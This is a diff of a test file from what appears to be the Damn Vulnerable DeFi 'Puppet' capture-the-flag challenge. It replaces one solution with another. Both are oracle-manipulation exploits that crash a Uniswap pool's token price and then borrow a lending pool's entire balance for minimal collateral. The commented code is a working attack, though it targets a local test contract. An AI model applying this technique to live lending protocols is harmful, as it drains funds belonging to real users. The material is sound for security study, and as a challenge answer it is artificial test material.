@@ -132,94 +132,50 @@ describe('[Challenge] Puppet', function () {
 
 	it('Exploit', async function () {
 		/** CODE YOUR EXPLOIT HERE */
-		// reserve 1 eth for gas fee
-		const ETH_MANTISSA = BigNumber.from(10).pow(18);
-		let INITIAL_ETH = ethers.utils.parseEther('20');
-
-		const computeOraclePrice = async () => {
-			const ethBalance = await ethers.provider.getBalance(
-				this.uniswapExchange.address,
-			);
-
-			const tokenBalance = await this.token.balanceOf(
-				this.uniswapExchange.address,
-			);
-
-			return ethBalance.mul(ETH_MANTISSA).div(tokenBalance);
-		};
 
 		const getDeadline = async () => {
-			const block = await web3.eth.getBlock('latest');
+			const block = await ethers.provider.getBlock('latest');
 			return block.timestamp + 300;
 		};
 
+		ethRequired = await this.lendingPool.calculateDepositRequired(
+			POOL_INITIAL_TOKEN_BALANCE,
+		);
+
 		await this.token
 			.connect(attacker)
-			.approve(this.uniswapExchange.address, BigNumber.from(2).pow(256).sub(1));
+			.approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
 
-		let poolBalance = await this.token.balanceOf(this.lendingPool.address);
-
-		// borrow => swap
-		// collateral will be decrease after each swap since eth_reserve / token_reserve will goes down in each iteration
-		// loop until pool balance reach zero
-		while (poolBalance.gt(BigNumber.from(0))) {
-			let price = await computeOraclePrice();
-			const borrowToken = INITIAL_ETH.mul(ETH_MANTISSA).div(price.mul(2));
-
-			const borrowAmount = borrowToken.gte(poolBalance)
-				? poolBalance
-				: borrowToken;
-
-			const depositRequired = await this.lendingPool.calculateDepositRequired(
-				borrowToken,
-			);
-
-			await this.lendingPool
-				.connect(attacker)
-				.borrow(borrowAmount, { value: depositRequired });
-
-			const balanceAttacker = await this.token.balanceOf(attacker.address);
-
-			const deadline = await getDeadline();
-
-			await this.uniswapExchange
-				.connect(attacker)
-				.tokenToEthSwapInput(
-					balanceAttacker,
-					ethers.utils.parseEther('0.000001'),
-					deadline,
-				);
-
-			INITIAL_ETH = (await ethers.provider.getBalance(attacker.address))
-				.mul(80)
-				.div(100);
-
-			poolBalance = await this.token.balanceOf(this.lendingPool.address);
-		}
-
-		const deadline = await getDeadline();
-
-		const ethReserve = await ethers.provider.getBalance(
-			this.uniswapExchange.address,
-		);
-
-		const tokenReserve = await this.token.balanceOf(
-			this.uniswapExchange.address,
-		);
-
-		// swap eth for token
-		// token_out = eth_in * token_reserve / eth_reserve
-		// we will gain lot of tokens since eth_reserve << token_reserve
-		const outToken = calculateTokenToEthInputPrice(
-			INITIAL_ETH,
-			ethReserve,
-			tokenReserve,
-		);
-		const swapAmount = outToken.gte(tokenReserve) ? tokenReserve : outToken;
+		// will cause eth left in pool ~ 0.1
+		// which will make the price of 1 DVT = 0.1 / 1010 = 0.00009901 ETH
+		let deadline = await getDeadline();
 		await this.uniswapExchange
 			.connect(attacker)
-			.ethToTokenSwapOutput(swapAmount, deadline, {
-				value: INITIAL_ETH,
+			.tokenToEthSwapInput(
+				ATTACKER_INITIAL_TOKEN_BALANCE,
+				ethers.utils.parseEther('1'),
+				deadline,
+			);
+
+		// the balance required to borrow 100,000 DVT will be reduced to
+		//  price * 2 = 100,000 x 0.00009901 x 2 ~ 19 ETH
+		const balance = await ethers.provider.getBalance(attacker.address);
+		const depositRequired = await this.lendingPool.calculateDepositRequired(
+			POOL_INITIAL_TOKEN_BALANCE,
+		);
+		expect(depositRequired).to.be.lt(balance);
+
+		// borrow all from the pool
+		await this.lendingPool
+			.connect(attacker)
+			.borrow(POOL_INITIAL_TOKEN_BALANCE, { value: depositRequired });
+
+		// need to swap eth for token to make attacker balance greater than POOL_INITIAL_TOKEN_BALANCE
+		deadline = await getDeadline();
+		await this.uniswapExchange
+			.connect(attacker)
+			.ethToTokenSwapOutput(ethers.utils.parseEther('1'), deadline, {
+				value: ethers.utils.parseEther('1'),
 			});
 	});
 
